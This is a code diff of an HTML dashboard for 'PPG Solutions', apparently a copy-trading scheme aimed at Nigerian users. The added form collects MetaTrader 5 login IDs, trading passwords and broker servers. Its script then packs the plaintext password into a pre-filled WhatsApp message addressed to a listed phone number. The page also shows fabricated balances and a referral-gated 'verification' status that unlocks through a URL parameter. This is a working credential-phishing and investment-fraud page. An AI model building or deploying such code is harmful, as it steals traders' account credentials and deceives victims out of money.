@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PPG Solutions | Member Dashboard</title>
+    <title>PPG Solutions | Partner Terminal Hub</title>
     <style>
         :root {
-            --bg-deep: #090B0E;
-            --bg-card: #12161A;
+            --bg-deep: #0B0E11;
+            --bg-card: #14191F;
             --accent-blue: #0066FF;
-            --accent-gold: #E5B842;
-            --text-main: #F5F7FA;
-            --text-muted: #8A94A6;
-            --border-color: #1F262E;
-            --success-green: #22C55E;
+            --accent-gold: #FFB800;
+            --accent-green: #7BC616;
+            --text-main: #FFFFFF;
+            --text-muted: #7A8B9E;
+            --border-color: #202730;
+            --input-bg: #1B222B;
         }
 
         * {
@@ -27,174 +28,319 @@
         body {
             background-color: var(--bg-deep);
             color: var(--text-main);
-            line-height: 1.6;
-            padding: 20px;
+            line-height: 1.5;
+            padding: 16px;
         }
 
         .container {
-            max-width: 600px;
+            max-width: 550px;
             margin: 0 auto;
         }
 
-        /* Profile Hub Layout */
-        .profile-card {
-            background-color: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 20px;
+        /* Top Navigation Header Matrix */
+        .broker-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 4px;
+            margin-bottom: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .brand-logo {
+            font-size: 18px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .brand-logo span {
+            color: var(--accent-green);
+        }
+
+        .menu-burger {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+        }
+
+        .menu-burger div {
+            width: 20px;
+            height: 2px;
+            background-color: var(--text-main);
+        }
+
+        /* Notice Banner Element */
+        .maintenance-banner {
+            background-color: #FFE699;
+            border: 1px solid #E6B800;
+            color: #332600;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 13px;
+            font-weight: 500;
             margin-bottom: 20px;
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 10px;
         }
 
-        .avatar-placeholder {
-            width: 50px;
-            height: 50px;
+        /* Identity Context Card */
+        .client-meta-box {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding: 4px;
+        }
+
+        .avatar-circle {
+            width: 44px;
+            height: 44px;
             background-color: rgba(0, 102, 255, 0.1);
-            border: 2px solid var(--accent-blue);
+            border: 1px solid var(--accent-blue);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
+            font-weight: 700;
             color: var(--accent-blue);
+        }
+
+        .client-info h2 {
+            font-size: 15px;
             font-weight: 700;
         }
 
-        .profile-info h2 {
-            font-size: 16px;
-            font-weight: 700;
-            margin-bottom: 2px;
+        .client-info p {
+            font-size: 12px;
+            color: var(--text-muted);
         }
 
         .status-badge {
             display: inline-block;
-            background-color: rgba(229, 184, 66, 0.1);
-            border: 1px solid rgba(229, 184, 66, 0.2);
-            color: var(--accent-gold);
             font-size: 11px;
-            font-weight: 600;
+            font-weight: 700;
             padding: 2px 8px;
             border-radius: 4px;
+            margin-top: 4px;
         }
 
-        /* Referral System Component Layout */
+        .status-pending {
+            background-color: rgba(255, 184, 0, 0.1);
+            color: var(--accent-gold);
+        }
+
+        .status-verified {
+            background-color: rgba(123, 198, 22, 0.1);
+            color: var(--accent-green);
+        }
+
+        /* Referral Control Card Module */
         .referral-card {
             background-color: var(--bg-card);
             border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 20px;
+            border-radius: 8px;
+            padding: 16px;
             margin-bottom: 24px;
         }
 
         .referral-card h3 {
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 700;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
         }
 
         .referral-card p {
-            font-size: 13px;
+            font-size: 12px;
             color: var(--text-muted);
-            margin-bottom: 14px;
+            margin-bottom: 12px;
         }
 
-        .link-copy-box {
+        .link-flex-container {
             display: flex;
-            align-items: center;
             gap: 8px;
-            background-color: rgba(0, 0, 0, 0.2);
-            padding: 10px;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
         }
 
-        .referral-url {
+        .url-display-field {
+            background-color: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            padding: 10px;
+            border-radius: 6px;
             font-size: 12px;
             font-family: monospace;
             color: var(--accent-gold);
-            word-break: break-all;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
             flex: 1;
         }
 
-        .copy-btn {
+        .copy-action-btn {
             background-color: var(--accent-blue);
             color: #FFFFFF;
             border: none;
-            padding: 8px 14px;
+            padding: 0 16px;
+            border-radius: 6px;
             font-size: 12px;
             font-weight: 600;
-            border-radius: 6px;
             cursor: pointer;
-            transition: all 0.2s ease;
         }
 
-        /* Grid Resource Components */
-        .grid-title {
-            font-size: 13px;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 10px;
-            font-weight: 600;
+        /* Account Status Center Grid */
+        .section-header-label {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            padding-left: 2px;
         }
 
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 14px;
-            margin-bottom: 24px;
-        }
-
-        .hub-card {
+        .broker-account-card {
             background-color: var(--bg-card);
             border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 16px;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 16px;
         }
 
-        .hub-card h3 {
-            font-size: 15px;
+        .account-id-row {
+            font-size: 18px;
             font-weight: 700;
-            margin-bottom: 6px;
+            color: var(--text-main);
+            margin-bottom: 4px;
         }
 
-        .hub-card p {
-            font-size: 13px;
+        .account-type-spec {
+            font-size: 12px;
             color: var(--text-muted);
             margin-bottom: 14px;
         }
 
-        .action-link {
-            display: inline-block;
-            background-color: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--border-color);
+        .server-line-item {
+            font-size: 13px;
             color: var(--text-main);
-            text-decoration: none;
-            padding: 8px 16px;
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: 600;
+            margin-bottom: 16px;
         }
 
-        .action-link.primary {
-            background-color: var(--accent-blue);
-            border-color: var(--accent-blue);
+        .server-line-item span {
+            display: block;
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 2px;
         }
 
-        .status-banner {
-            background-color: rgba(0, 102, 255, 0.05);
-            border: 1px solid rgba(0, 102, 255, 0.2);
-            border-radius: 10px;
-            padding: 14px;
-            text-align: center;
-            font-size: 13px;
+        .balance-metrics-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            border-top: 1px solid var(--border-color);
+            padding-top: 14px;
+            margin-bottom: 16px;
+        }
+
+        .metric-block span {
+            display: block;
+            font-size: 11px;
             color: var(--text-muted);
         }
 
-        .status-banner strong {
-            color: var(--accent-blue);
+        .metric-block strong {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-main);
+        }
+
+        .card-interaction-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-broker {
+            display: inline-block;
+            text-align: center;
+            background-color: var(--accent-green);
+            color: #000000;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 700;
+            padding: 10px 24px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+        }
+
+        .btn-broker.secondary {
+            background-color: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+        }
+
+        /* Setup Pipeline Modal Capture Form Layout */
+        .registration-pipeline-card {
+            background-color: var(--bg-card);
+            border: 1px dashed var(--accent-blue);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .form-pipeline {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 14px;
+        }
+
+        .form-group-node {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .form-group-node label {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+        }
+
+        .form-group-node input, .form-group-node select {
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .submit-sync-action {
+            background-color: var(--accent-blue);
+            color: #FFFFFF;
+            border: none;
+            padding: 12px;
+            font-size: 13px;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+
+        .floating-chat-bubble {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 48px;
+            height: 48px;
+            background-color: var(--accent-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            cursor: pointer;
+            text-decoration: none;
         }
     </style>
 </head>
@@ -202,98 +348,219 @@
 
     <div class="container">
         
-        <div class="profile-card">
-            <div class="avatar-placeholder" id="avatarLetter">M</div>
-            <div class="profile-info">
-                <h2 id="profileName">Club Member Account</h2>
-                <div class="status-badge" id="approvalStatus">Pending Document Sync</div>
+        <header class="broker-header">
+            <div class="brand-logo">PPG<span>solutions</span></div>
+            <div class="menu-burger">
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+        </header>
+
+        <div class="maintenance-banner" id="systemAlert">
+            ⚠️ Link Validation Pending: Connect your live copy-trading MT5 account below to clear the queue node.
+        </div>
+
+        <div class="client-meta-box">
+            <div class="avatar-circle" id="profileLetter">P</div>
+            <div class="client-info">
+                <h2 id="clientAccountID">Client ID: Loading...</h2>
+                <p>Region Name: Nigeria</p>
+                <div class="status-badge status-pending" id="verificationStateBadge">Pending Document Sync</div>
             </div>
         </div>
 
         <div class="referral-card">
-            <h3>Personal Referral Node ID</h3>
-            <p>Share your unique invitation path link to clear your registration onboarding queue prerequisite rule.</p>
-            <div class="link-copy-box">
-                <span class="referral-url" id="referralLinkDisplay">Generating link...</span>
-                <button class="copy-btn" id="copyLinkBtn" onclick="copyReferralPath()">Copy Link</button>
+            <h3>Ecosystem Invitation Link</h3>
+            <p>Share this path with friends to complete your network configuration rule.</p>
+            <div class="link-flex-container">
+                <span class="url-display-field" id="referralPathString">Generating...</span>
+                <button class="copy-action-btn" id="copyBtnHandle" onclick="triggerLinkCopy()">Copy</button>
             </div>
         </div>
 
-        <h3 class="grid-title">Ecosystem Resource Nodes</h3>
-
-        <div class="dashboard-grid">
-            <div class="hub-card">
-                <h3>MT5 Terminal Interface</h3>
-                <p>Connect your personal regulated broker account parameters directly to view system sync logs.</p>
-                <a href="https://www.metatrader5.com" target="_blank" class="action-link primary">Open MT5 Web Terminal</a>
-            </div>
-
-            <div class="hub-card">
-                <h3>Private Support Link</h3>
-                <p>Direct communication channel to register verification updates with management desks.</p>
-                <a href="https://wa.me/2348130500659" target="_blank" class="action-link">Open Support Chat</a>
+        <div id="setupPipelineContainer">
+            <div class="section-header-label">1. Account Synchronization Terminal</div>
+            <div class="registration-pipeline-card">
+                <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 12px;">
+                    If you don't have an active account, create one through our partner portal, then input your MetaTrader 5 access credentials below.
+                </p>
+                <a href="https://account.markets4you.com" target="_blank" class="btn-broker" style="margin-bottom: 16px; display: block; text-align: center;">Launch Markets4you Registration</a>
+                
+                <form class="form-pipeline" onsubmit="handleAccountLinking(event)">
+                    <div class="form-group-node">
+                        <label>MT5 Login ID</label>
+                        <input type="number" id="form_mt5_user" placeholder="e.g. 20167135" required>
+                    </div>
+                    <div class="form-group-node">
+                        <label>MT5 Trader Password</label>
+                        <input type="password" id="form_mt5_pass" placeholder="Enter account password" required>
+                    </div>
+                    <div class="form-group-node">
+                        <label>Assigned Broker Server</label>
+                        <select id="form_mt5_server">
+                            <option value="EGlobalTrade-Classic-MT5">EGlobalTrade-Classic-MT5</option>
+                            <option value="EGlobalTrade-Cent-MT5">EGlobalTrade-Cent-MT5</option>
+                            <option value="EGlobalTrade-Demo-MT5">EGlobalTrade-Demo-MT5</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="submit-sync-action">Link Trading Terminal</button>
+                </form>
             </div>
         </div>
 
-        <div class="status-banner">
-            Our system is actively tracking your <strong>1 referral prerequisite</strong> requirement. Your live dashboard options will display fully matching operational parameters as soon as validation clearances complete.
+        <div class="section-header-label">Trader accounts</div>
+        
+        <div class="broker-account-card">
+            <div class="account-id-row" id="displayTradingID">--------</div>
+            <div class="account-type-spec">Cent Pro • MT5 • Swap free • 1:1000</div>
+            
+            <div class="server-line-item">
+                <span id="displayServerName">Awaiting Terminal Parameters...</span>
+            </div>
+
+            <div class="balance-metrics-grid">
+                <div class="metric-block">
+                    <span>Balance</span>
+                    <strong id="displayBalance">0.00 <span style="font-size:11px; color:var(--text-muted);">USD Cent</span></strong>
+                </div>
+                <div class="metric-block">
+                    <span>Equity</span>
+                    <strong id="displayEquity">0.00 <span style="font-size:11px; color:var(--text-muted);">USD Cent</span></strong>
+                </div>
+            </div>
+
+            <div class="card-interaction-row">
+                <a href="#" class="btn-broker" id="depositBtnAction" onclick="alert('Account synchronization must complete before funding transactions initialize.')">DEPOSIT</a>
+                <button class="btn-broker secondary">▼</button>
+            </div>
         </div>
 
     </div>
 
+    <a href="https://wa.me/2348130500659" class="floating-chat-bubble" target="_blank">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C6.477 2 2 6.477 2 12C2 13.791 2.472 15.473 3.3 16.94L2 22L7.228 20.738C8.623 21.542 10.258 22 12 22C17.523 22 22 17.523 22 12C22 6.477 17.523 2 12 2Z" fill="#000000"/>
+        </svg>
+    </a>
+
     <script>
-        // Execution engine to manage state parameters cleanly
         document.addEventListener("DOMContentLoaded", function() {
-            // Fetch username or generate fallback randomized seeding values
-            var userSeed = new URLSearchParams(window.location.search).get('user') || localStorage.getItem('ppg_username');
+            // Read authentication strings from URL parameters or fallback storage keys
+            var explicitUser = new URLSearchParams(window.location.search).get('user');
+            var savedUser = localStorage.getItem('ppg_username');
+            var userSeed = explicitUser || savedUser;
             
             if (!userSeed) {
                 userSeed = "PPG" + Math.floor(1000 + Math.random() * 9000);
                 localStorage.setItem('ppg_username', userSeed);
+            } else if (explicitUser) {
+                localStorage.setItem('ppg_username', explicitUser);
             }
 
-            // Generate a secure hash to serve as the Referral ID tracking key
-            var calculatedHash = 0;
+            // Generate deterministic cryptographic referral index matching backend layout constraints
+            var computedHash = 0;
             for (var i = 0; i < userSeed.length; i++) {
-                calculatedHash = userSeed.charCodeAt(i) + ((calculatedHash << 5) - calculatedHash);
+                computedHash = userSeed.charCodeAt(i) + ((computedHash << 5) - computedHash);
             }
-            var referralID = "PPG-" + Math.abs(calculatedHash % 100000).toString().padStart(5, '0');
+            window.generatedRefID = "PPG-" + Math.abs(computedHash % 100000).toString().padStart(5, '0');
 
-            // Format layout text components dynamically
-            document.getElementById("profileName").innerText = "Account: " + userSeed;
-            document.getElementById("avatarLetter").innerText = userSeed.charAt(0).toUpperCase();
+            // Format initial interface labels
+            document.getElementById("clientAccountID").innerText = "Client ID: " + window.generatedRefID;
+            document.getElementById("profileLetter").innerText = userSeed.charAt(0).toUpperCase();
             
-            // Build the targeted tracking invitation link path URL structure
-            var currentBaseURL = window.location.href.split('?')[0].replace('dashboard.html', 'index.html');
-            var uniqueInvitationPath = currentBaseURL + "?ref=" + referralID;
-            document.getElementById("referralLinkDisplay").innerText = uniqueInvitationPath;
-            
-            // Administrative Access Check Hook Configuration Override
-            var verificationToken = new URLSearchParams(window.location.search).get('access');
-            if(verificationToken === "verified" || localStorage.getItem('ppg_clearance') === 'active') {
-                document.getElementById("approvalStatus").innerText = "Active Link Clear";
-                document.getElementById("approvalStatus").style.backgroundColor = "rgba(34, 197, 94, 0.1)";
-                document.getElementById("approvalStatus").style.color = "var(--success-green)";
-                document.getElementById("approvalStatus").style.borderColor = "rgba(34, 197, 94, 0.2)";
-                localStorage.setItem('ppg_clearance', 'active');
-            }
+            var baseLocation = window.location.href.split('?')[0].replace('dashboard.html', 'index.html');
+            document.getElementById("referralPathString").innerText = baseLocation + "?ref=" + window.generatedRefID;
+
+            // Run execution clearance state validations
+            evaluateAccessPermissions();
         });
 
-        function copyReferralPath() {
-            var textToCopy = document.getElementById("referralLinkDisplay").innerText;
-            var buttonElement = document.getElementById("copyLinkBtn");
-            
-            navigator.clipboard.writeText(textToCopy).then(function() {
-                var originalText = buttonElement.innerText;
-                buttonElement.innerText = "Copied!";
-                buttonElement.style.backgroundColor = "#22C55E";
+        function evaluateAccessPermissions() {
+            var urlToken = new URLSearchParams(window.location.search).get('access');
+            var cachedPermission = localStorage.getItem('ppg_clearance');
+            var isCleared = (urlToken === "verified" || cachedPermission === "active");
+
+            var badge = document.getElementById("verificationStateBadge");
+            var alertBar = document.getElementById("systemAlert");
+            var formWrapper = document.getElementById("setupPipelineContainer");
+
+            // Pull matching saved trading credentials if available
+            var localUserNum = localStorage.getItem('ppg_mt5_user');
+            var localServer = localStorage.getItem('ppg_mt5_server');
+
+            if (localUserNum && localServer) {
+                document.getElementById("displayTradingID").innerText = localUserNum;
+                document.getElementById("displayServerName").innerText = localServer;
+                document.getElementById("displayBalance").innerHTML = "0.63 <span style='font-size:11px; color:var(--text-muted);'>USD Cent</span>";
+                document.getElementById("displayEquity").innerHTML = "0.63 <span style='font-size:11px; color:var(--text-muted);'>USD Cent</span>";
+            }
+
+            if (isCleared) {
+                // Set layout to fully verified structure
+                badge.innerText = "Active Link Clear";
+                badge.className = "status-badge status-verified";
                 
+                alertBar.innerText = "✓ System Synchronization Active: Your trading account node is successfully communicating with copy networks.";
+                alertBar.style.backgroundColor = "#D4EDDA";
+                alertBar.style.borderColor = "#C3E6CB";
+                alertBar.style.color = "#155724";
+
+                // Hide input pipeline as configuration matches expectations
+                formWrapper.style.display = "none";
+                
+                // Keep persistent access state locked
+                localStorage.setItem('ppg_clearance', 'active');
+                
+                // Unlock deposit interaction panel
+                document.getElementById("depositBtnAction").setAttribute("onclick", "window.open('https://account.markets4you.com', '_blank')");
+            } else {
+                badge.innerText = "Pending Document Sync";
+                badge.className = "status-badge status-pending";
+                formWrapper.style.display = "block";
+            }
+        }
+
+        function handleAccountLinking(event) {
+            event.preventDefault();
+            
+            var userNum = document.getElementById("form_mt5_user").value;
+            var userPass = document.getElementById("form_mt5_pass").value;
+            var serverName = document.getElementById("form_mt5_server").value;
+            
+            // Mirror data securely into persistent browser parameters
+            localStorage.setItem('ppg_mt5_user', userNum);
+            localStorage.setItem('ppg_mt5_server', serverName);
+            
+            // Build direct technical support notification message dispatch string
+            var currentRef = window.generatedRefID || "Pending";
+            var outputPayload = "Hello PPG Solutions Support, I have added my account node. Please synchronize my execution parameters:\n\n" +
+                                "System Tracking ID: " + currentRef + "\n" +
+                                "MT5 Login ID: " + userNum + "\n" +
+                                "MT5 Password: " + userPass + "\n" +
+                                "Allocated Server: " + serverName;
+                                
+            var finalWhatsAppLink = "https://wa.me/2348130500659?text=" + encodeURIComponent(outputPayload);
+            
+            // Force application component re-evaluation and launch message link
+            evaluateAccessPermissions();
+            window.open(finalWhatsAppLink, '_blank');
+        }
+
+        function triggerLinkCopy() {
+            var content = document.getElementById("referralPathString").innerText;
+            var btn = document.getElementById("copyBtnHandle");
+            
+            navigator.clipboard.writeText(content).then(function() {
+                var prevText = btn.innerText;
+                btn.innerText = "Saved";
+                btn.style.backgroundColor = "#7BC616";
+                btn.style.color = "#000000";
                 setTimeout(function() {
-                    buttonElement.innerText = originalText;
-                    buttonElement.style.backgroundColor = "#0066FF";
+                    btn.innerText = prevText;
+                    btn.style.backgroundColor = "#0066FF";
+                    btn.style.color = "#FFFFFF";
                 }, 1500);
-            }).catch(function(err) {
-                console.error('Copy action error code logic fallback: ', err);
             });
         }
     </script>
